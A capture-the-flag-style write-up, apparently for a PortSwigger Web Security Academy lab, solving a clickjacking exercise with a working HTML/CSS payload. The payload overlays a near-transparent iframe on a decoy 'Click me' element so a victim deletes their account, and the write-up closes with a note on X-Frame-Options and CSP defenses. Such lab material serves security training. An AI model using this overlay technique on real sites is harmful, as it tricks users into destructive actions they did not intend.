# Clickjacking - Basic clickjacking with CSRF token protection

## 📌 Lab Details
- **Title**: Basic clickjacking with CSRF token protection
- **Difficulty**: Apprentice
- **Category**: Clickjacking
- **Lab URL**: https://portswigger.net/academy/labs/launch/ccfdc81094e272982bb5995e349d1fee4cb10179392ed6b49586fed5837006a0?referrer=%2fweb-security%2fclickjacking%2flab-basic-csrf-protected

## 🔍 Summary
This lab demonstrates **Clickjacking** by overlaying a transparent iframe containing the “Delete account” button over a deceptive “Click me” element on a decoy page, tricking the victim into deleting their account.

## 🛠 Steps to Solve
1. Log in to the given account.
2. Inject the payload on the **Exploit** server:
   ```sh
   <style>
    iframe {
            position:relative;
            width:1250;
            height:600;
            opacity:0.0000001;
            z-index: 2;
   }
    div {
            position:absolute;
            top:540;
            left:90;
            z-index:1;
   }
   </style>
   <div>Click me</div>
   <iframe src="https://0a2d00bd03acfe5380dbf974008e00ef.web-security-academy.net/my-account"></iframe>
   ```
3. Adjust the values of the template to align the `Click me` button with the `delete account` button.
4. Deliver exploit to the victim to complete the lab.
   
## 📖 Key Takeaways
- **Clickjacking leverages transparent** iframes to trick users into clicking hidden actions.
- Proper alignment and opacity adjustments are critical for a successful attack.
- Defenses like `X-Frame-Options` or CSP `frame-ancestors` can mitigate such attacks.

## 🖼️ Screenshot 
![image](https://github.com/user-attachments/assets/5c4bcc35-691f-4802-83e0-666ac710897b)
![image](https://github.com/user-attachments/assets/e9842567-440b-4bab-9064-7e77d3e084d6)
![image](https://github.com/user-attachments/assets/ac53888c-9719-49e1-bd51-ab0ddff20f0b)
